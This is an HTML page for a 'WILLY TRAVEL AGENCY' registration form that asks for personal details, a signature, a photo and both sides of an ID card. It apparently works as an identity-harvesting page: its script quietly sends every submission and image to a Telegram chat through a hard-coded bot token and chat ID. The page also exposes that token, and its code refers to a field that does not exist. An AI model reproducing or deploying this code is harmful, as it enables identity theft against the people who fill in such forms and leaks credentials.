<!DOCTYPE html>
<html lang="am">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>WILLY TRAVEL AGENCY - Mobile Form</title>

<style>
  :root{--accent:#0a8d34;--danger:#e63939;}

  body{
    font-family:Arial,Helvetica,sans-serif;
    background:#f2f2f2;
    margin:0;padding:12px;
  }

  .container{
    max-width:760px;margin:auto;background:#fff;
    padding:14px;border-radius:10px;
    box-shadow:0 6px 20px rgba(0,0,0,.08);
  }

  .flag{display:block;margin:6px auto;width:110px}
  h1{text-align:center;margin:6px 0;font-size:20px;font-weight:700}

  label{font-weight:700;margin-top:8px;display:block}
  input,select,button{
    font-size:16px;padding:10px;
    border-radius:8px;border:1px solid #cfcfcf;
    box-sizing:border-box;
  }

  .row{display:flex;gap:10px;flex-direction:column}
  @media(min-width:640px){.row.two{flex-direction:row}}

  .img-preview{
    width:100%;max-width:220px;height:160px;
    object-fit:cover;border:1px solid #ddd;border-radius:6px;margin-top:6px
  }

  .section{
    background:#f7f7f7;padding:8px;
    border-radius:6px;margin-top:14px;font-weight:700
  }

  canvas{
    width:100%;height:200px;border:2px solid #333;
    border-radius:6px;touch-action:none;background:#fff;display:block
  }

  .controls{display:flex;gap:8px;margin-top:8px}
  .controls button{flex:1}

  .btn-primary{background:var(--accent);color:#fff;border:none}
  .btn-clear{background:var(--danger);color:#fff;border:none}

  /* POPUP */
  #popupOverlay{
    position:fixed;top:0;left:0;width:100%;height:100%;
    background:rgba(0,0,0,.65);
    display:none;align-items:center;justify-content:center;
    z-index:999;
  }
  #popupBox{
    width:86%;max-width:360px;background:#fff;border-radius:14px;
    padding:20px;text-align:center;
    animation:popScale .4s ease;
  }
  @keyframes popScale{
    0%{transform:scale(0.5);opacity:0}
    100%{transform:scale(1);opacity:1}
  }
  .popup-title{
    font-size:20px;font-weight:700;color:#0a8d34;margin-bottom:10px;
  }
  .popup-code{
    font-size:24px;font-weight:800;color:#004aad;
    animation:codeGlow 1.2s infinite alternate;
  }
  @keyframes codeGlow{
    from{opacity:0.5;transform:scale(1)}
    to{opacity:1;transform:scale(1.08)}
  }

  /* Processing Loader */
  #loader{
    display:none;
    position:fixed;top:0;left:0;width:100%;height:100%;
    background:rgba(0,0,0,.6);
    z-index:1000;
    align-items:center;justify-content:center;
    color:white;font-size:22px;font-weight:bold;
  }
</style>
</head>
<body>

<div id="loader">Processing... Please wait</div>

<div class="container">

  <img class="flag" src="https://upload.wikimedia.org/wikipedia/commons/7/71/Flag_of_Ethiopia.svg">
  <h1>WILLY TRAVEL AGENCY</h1>

  <div class="row two">
    <div style="flex:1">
      <label>·çé·â∂ ·ä†·àµ·åà·â£ / Upload Photo</label>
      <input type="file" accept="image/*" id="photoInput">
      <img id="photoPreview" class="img-preview" style="display:none">
    </div>

    <div style="width:160px">
      <label>·âÄ·äï / Date</label>
      <input type="date" id="dateInput">
    </div>
  </div>

  <div class="section">Identity of Registrant</div>

  <label>·àô·àâ ·àµ·àù / FULL NAME</label><input id="fullName">
  <label>·çÜ·â≥ / SEX</label>
  <select id="sex"><option>Male</option><option>Female</option></select>
  <label>·ä•·ãµ·àú / AGE</label><input id="age" type="number">

  <label>·àµ·àç·ä≠ ·âÅ·å•·à≠ / PHONE</label><input id="phone">
  <label>·ä†·ãµ·à´·àª / ADDRESS</label><input id="address">

  <label>·âÅ·àò·âµ / Height (cm)</label><input id="height" type="number">
  <label>·ä≠·â•·ã∞·âµ / Weight (kg)</label><input id="weight" type="number">


  <label>·ãà·à®·ã≥ / District</label><input id="district">
  <label>·âÄ·â†·àå / Kebele</label><input id="kebele">

  <label>·ã®·âµ·ãç·àç·ãµ ·âÄ·äï / Birth Date</label><input id="bod" type="date">
  <label>·ã®·âµ·ãç·àç·ãµ ·â¶·â≥ / Birth Place</label><input id="bop">

  <div class="section">Holder Information</div>
  <label>·àµ·àù / NAME</label><input id="holderName">
  <label>·àµ·àç·ä≠ / PHONE</label><input id="holderPhone">

  <div class="section">Signature</div>
  <canvas id="signaturePad"></canvas>
  <div class="controls">
    <button class="btn-clear" id="clearBtn">Clear</button>
    <button class="btn-primary" id="previewBtn">Preview</button>
  </div>
  <img id="signaturePreview" class="img-preview" style="display:none">

  <div class="section">ID Upload</div>

  <label>ID Front</label>
  <input type="file" accept="image/*" id="idFrontInput">
  <img id="idFrontPreview" class="img-preview" style="display:none">

  <label>ID Back</label>
  <input type="file" accept="image/*" id="idBackInput">
  <img id="idBackPreview" class="img-preview" style="display:none">

  <button id="submitBtn" class="btn-primary" style="margin-top:14px">Submit</button>
</div>

<!-- POPUP -->
<div id="popupOverlay">
  <div id="popupBox">
    <div class="popup-title">Form Submitted Successfully!</div>
    <div>Your Unique Code:</div>
    <div id="uniqueCode" class="popup-code"></div>
  </div>
</div>

<script>
const $ = id => document.getElementById(id);

/* Image Preview */
function preview(input, img){
  $(input).addEventListener("change", () => {
    const f = $(input).files[0];
    if (!f){ $(img).style.display="none"; return; }
    $(img).src = URL.createObjectURL(f);
    $(img).style.display="block";
  });
}
preview("photoInput","photoPreview");
preview("idFrontInput","idFrontPreview");
preview("idBackInput","idBackPreview");

/* Signature Pad */
const canvas=$("signaturePad");
const ctx=canvas.getContext("2d");
let drawing=false;

function resizeCanvas(){
  const r=canvas.getBoundingClientRect();
  canvas.width=r.width;
  canvas.height=r.height;
  ctx.lineWidth=2.5;
  ctx.lineCap="round";
}
resizeCanvas();

canvas.addEventListener("pointerdown",e=>{
  drawing=true;
  ctx.beginPath();
  ctx.moveTo(e.offsetX,e.offsetY);
});
canvas.addEventListener("pointermove",e=>{
  if(!drawing)return;
  ctx.lineTo(e.offsetX,e.offsetY);
  ctx.stroke();
});
canvas.addEventListener("pointerup",()=>drawing=false);

$("clearBtn").onclick=()=>{
  ctx.clearRect(0,0,canvas.width,canvas.height);
  $("signaturePreview").style.display="none";
};

$("previewBtn").onclick=()=>{
  $("signaturePreview").src=canvas.toDataURL();
  $("signaturePreview").style.display="block";
};

/* Telegram */
const BOT="8547531640:AAGBhfzBDJ18t40R4F4z-sO5a50Q6Mj2Fgw";
const CHAT="8267646853";

async function sendText(text){
  return fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({ chat_id:CHAT, text })
  });
}

async function sendPhoto(file,caption=""){
  const fd=new FormData();
  fd.append("chat_id",CHAT);
  fd.append("photo",file);
  fd.append("caption",caption);

  return fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{
    method:"POST", body:fd
  });
}

/* Submit */
$("submitBtn").onclick=async()=>{

  if(!$("fullName").value.trim()){
    alert("Enter Full Name"); return;
  }

  // Show loader
  $("loader").style.display="flex";

  const code="WTA-"+(Math.floor(Math.random()*900000)+100000);
  $("uniqueCode").innerText=code;

  let msg=
`üìå WILLY TRAVEL AGENCY - NEW FORM
--------------------------------------
üë§ Name: ${$("fullName").value}
‚öß Sex: ${$("sex").value}
üéÇ Age: ${$("age").value}
üìû Phone: ${$("phone").value}
üè† Address: ${$("address").value}

üìè Height: ${$("height").value} cm
‚öñÔ∏è Weight: ${$("weight").value} kg
‚≠ê Mark: ${$("distinct").value}

üåç District: ${$("district").value}
üèò Kebele: ${$("kebele").value}

üéâ Birth Date: ${$("bod").value}
üìç Birth Place: ${$("bop").value}

üë®‚Äçüë©‚Äçüë¶ Holder: ${$("holderName").value}
üìû Holder Phone: ${$("holderPhone").value}

üîê UNIQUE CODE: ${code}
`;

  await sendText(msg);

  if($("photoInput").files[0]) await sendPhoto($("photoInput").files[0],"User Photo");
  if($("idFrontInput").files[0]) await sendPhoto($("idFrontInput").files[0],"ID Front");
  if($("idBackInput").files[0]) await sendPhoto($("idBackInput").files[0],"ID Back");

  canvas.toBlob(async blob=>{
    if(blob) await sendPhoto(blob,"Signature");
  });

  // Hide loader & show popup
  setTimeout(()=>{
    $("loader").style.display="none";
    $("popupOverlay").style.display="flex";
  },1200);
};
</script>

</body>
</html>